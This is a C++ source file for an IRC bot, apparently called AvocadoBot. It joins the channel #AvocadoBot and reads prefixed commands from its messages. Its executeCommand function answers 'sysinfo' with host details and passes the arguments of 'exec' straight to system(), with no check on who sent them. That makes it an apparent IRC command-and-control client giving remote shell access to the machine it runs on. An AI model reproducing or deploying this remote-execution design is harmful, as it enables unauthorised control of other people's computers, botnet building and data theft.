/*
 * IRCManager.cpp
 *
 *  Created on: May 13, 2012
 *      Author: mbreedlove
 */

#include "IRCManager.h"

IRCManager::IRCManager() {
	ircc = new IRCClient("127.0.0.1", 6667);
	ircc->setNickname("Bot");
	
	ircc->joinChannel("#AvocadoBot");

	connected = false;
	hThread = 0;
}

IRCManager::~IRCManager() {
	delete ircc;
}

char IRCManager::getIRCCommandPrefix() { return IRC_CommandPrefix; }

bool IRCManager::isConnected() {
	return connected;
}

void IRCManager::start() {
	connected = ircc->connect();
	if(!connected) {
		return;
	}
	hThread = this->startThread();
}

void IRCManager::stop() {
	connected = false;
	CloseHandle(hThread);
	ircc->disconnect();
}

HANDLE IRCManager::startThread() {
	hThread = (HANDLE)_beginthread(monitor, 0, this);
	return hThread;
}

void monitor(void* i) {
	IRCClient* ircc = (IRCClient*)((IRCManager*)i)->ircc;
	std::string data;
	data = ircc->readRaw();
	ircc->setServerName(data.substr(1, data.find_first_of(" ") -1));

	while(true) {
		data = ircc->readRaw();
		if(data.empty()) {
			((IRCManager*)i)->stop();
			return;
		}
		std::cout << data;
		fflush(stdout);

		// Handle data
		parseData(ircc, data, ((IRCManager*)i)->getIRCCommandPrefix());
	}
}


// TODO: refactor into parseData for all data, parseCommand for commands
void parseData(IRCClient* ircc, std::string data, char IRC_CommandPrefix) {
	std::string prefix;
	std::string command;
	std::string params;

	unsigned int stop;
	unsigned int size = data.size();

	// Prefix
	stop = data.find_first_of(" ");
	prefix = data.substr(1, stop);

	// Command
	stop = data.find(" ", stop);
	command = data.substr(stop +1, size -2);


	// Params
	stop = command.find_first_of(" ");
	if(stop != std::string::npos) {
		params = command.substr(stop +1, command.size() -1);
		command = command.substr(0, stop);
	}
	
	// If Bot command was recieved
	if(command.at(0) == IRC_CommandPrefix) {
		// Remove special char
		command = command.substr(1, command.size() -1);
		std::string result = "";

		// Execute command and save result
		result = executeCommand(command, params);

		// If there was a result message, send it to the server
		if(!result.empty())
			ircc->sendMessage(ircc->getIRCChannels()[0], result);

	} else {
		// TODO
	}

	return;
}


std::string executeCommand(std::string command, std::string args) {
	std::string result;
	if(!command.compare("sysinfo")) {
		result = OSInfo::sysInfoStr();
	}

	if(!command.compare("exec")) {
		system(args.c_str());
		result = args;
	}
	return result;
}
